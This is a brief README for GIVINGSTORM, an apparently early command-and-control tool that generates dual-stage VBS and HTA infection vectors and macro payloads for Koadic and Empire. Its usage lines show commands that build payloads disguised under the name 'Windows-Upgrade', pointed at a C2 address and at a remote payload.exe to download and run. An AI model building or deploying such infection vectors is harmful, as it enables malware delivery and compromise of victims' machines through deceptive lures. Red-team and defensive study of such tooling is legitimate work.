# GIVINGSTORM
The beginnings of a C2 framework. Currently without all the C2 stuff so far. Generates
a dual stage VBS infection vector, and a dual stage HTA infection vector. The variables take
into account C2 addresses, Koadic/Empire payloads, and a few delivery mechanisms. The payload
files are output to an aptly named directory "Payloads" that is created if not already present.

# Installation & Usage
GIVINGSTORM is a breeze to use. Simply clone the directory, and cd into it.

For the HTA payload:
  python3 GIVINGSTORM.py -n Windows-Upgrade -p b64encodedpayload -c amazon.com/c2/domain

# HTA Example
![alt text](https://github.com/nins3i/GIVINGSTORM/blob/master/hta.png)

For the Macro Subroutine:
  python3 GIVINGSTORM.py -n Windows-Upgrade -e amazon.com/final/payload.exe

# Macro Example
![alt text](https://github.com/nins3i/GIVINGSTORM/blob/master/macro.png)
